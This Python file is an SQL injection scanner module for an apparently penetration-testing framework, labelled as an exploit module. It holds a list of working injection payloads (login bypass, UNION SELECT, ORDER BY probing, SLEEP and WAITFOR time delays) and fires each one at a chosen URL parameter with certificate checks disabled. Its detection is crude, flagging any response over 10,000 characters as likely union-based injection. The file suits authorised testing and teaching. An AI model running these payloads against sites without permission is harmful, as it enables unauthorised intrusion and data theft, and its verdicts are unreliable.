"""SQL Injection scanner module"""

import requests
import urllib.parse
from colorama import Fore, Style
from modules.base import BaseModule

class SQLInjectionScanner(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "SQL Injection vulnerability scanner with multiple attack vectors"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
        }
        self.required_options = ["URL", "PARAM"]
        
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 'x'='x",
            "1' OR '1' = '1",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
        ]
        
        self.error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "mysqli",
            "PostgreSQL",
            "ORA-",
            "SQLite",
            "ODBC",
            "Microsoft SQL",
            "syntax error",
            "unclosed quotation",
            "quoted string not properly terminated",
        ]
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        
        print(f"{Fore.YELLOW}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"{Fore.CYAN}[{i}/{len(self.payloads)}] Testing payload: {payload[:50]}...{Style.RESET_ALL}")
            
            vulnerable, vuln_type = self._test_payload(url, param, payload, method, timeout)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
                print(f"{Fore.RED}[!] VULNERABLE ({vuln_type})!{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential SQL injection vulnerabilities!{Style.RESET_ALL}\n")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  Type: {vuln['type']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Param: {vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Payload: {vuln['payload']}{Style.RESET_ALL}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities detected{Style.RESET_ALL}\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def _test_payload(self, url, param, payload, method, timeout):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "Error-based SQLi"
            
            if len(response.text) > 10000:
                return True, "Union-based SQLi (suspected)"
            
        except requests.exceptions.Timeout:
            if "SLEEP" in payload or "WAITFOR" in payload:
                return True, "Time-based SQLi"
        except Exception:
            pass
        
        return False, None
